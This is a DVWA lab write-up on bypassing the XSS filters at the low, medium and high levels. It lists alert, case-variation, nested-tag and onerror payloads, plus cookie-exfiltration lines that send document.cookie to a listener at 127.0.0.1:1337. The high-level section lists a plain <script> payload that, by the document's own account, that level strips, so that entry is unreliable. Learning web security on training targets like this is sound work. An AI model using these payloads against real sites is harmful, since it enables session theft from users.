# Cross-site Scripting (XSS) (High Level)

## Vulnerability Overview

At the high-security level in DVWA, Cross-Site Scripting (XSS) attempts to be mitigated through a basic filtering mechanism using `preg_replace()`. This filter is designed to remove any input containing the word "script" in a case-insensitive manner. However, this approach has significant weaknesses:

- The filter only targets the exact word "script", ignoring other forms of JavaScript injection.
- Modified or nested tags can easily bypass the filter.
- The application directly reflects user input without proper output encoding.
- HTTP headers explicitly disable browser-based XSS protection with `X-XSS-Protection: 0`.

These issues make DVWA vulnerable to both reflected and stored XSS attacks even at higher security levels.

---

# Exploitation

## Low Security Level

### Source Code Analysis
- No XSS protection implemented.
- User input is directly reflected into the webpage.

### Payloads

1. Basic Alert Injection:
```html
<script>alert("You have been hacked")</script>
```
- Triggers a JavaScript alert when the page is loaded.

2. Cookie Theft:
```html
<script>alert(document.cookie)</script>
```
- Displays the current session cookie via an alert.

3. Cookie Exfiltration:
```html
<script>window.location='http://127.0.0.1:1337/?cookie='+document.cookie</script>
```
- Redirects the user's browser to an attacker-controlled server, sending the cookie as a query parameter.

---

## Medium Security Level

### Source Code Analysis
- The application attempts to replace the word "script" in the input.
- Does not account for closing tags or nested tags, allowing payloads to bypass the filter.

### Payloads

1. Case Variation Bypass:
```html
<SCRIPT>alert(document.cookie)</SCRIPT>
```
- Bypasses simple case-sensitive filtering.

2. Nested Tag Bypass:
```html
<scr<script>ipt>alert("You have been hacked")</script>
```
- Breaks up the keyword "script" to evade detection.

---

## High Security Level

### Source Code Analysis
- Improved filtering, but vulnerable to more sophisticated payloads using event handlers.

### Payloads

1. Basic Onerror Exploit:
```html
<img src=x onerror="alert('You have been hacked')">
```

2. Cookie Stealing with Onerror:
```html
<img src/onerror=alert(document.cookie)>
```

3. Redirect and Exfiltrate Cookie:
```html
<script>window.location='http://127.0.0.1:1337/?cookie='+document.cookie</script>
```

4. Alternate Redirect using Image:
```html
<img src=/ onerror="window.location='http://127.0.0.1:1337/?cookie='+document.cookie">
```

These payloads demonstrate that even at high-security settings, DVWA can still be exploited for XSS attacks using creative techniques.

---

# ✅ Conclusion

DVWA's XSS module, even at the High security level, remains vulnerable due to insufficient input validation and lack of proper output encoding. Exploitation techniques range from simple script injection to advanced payload crafting using event handlers and nested tags.
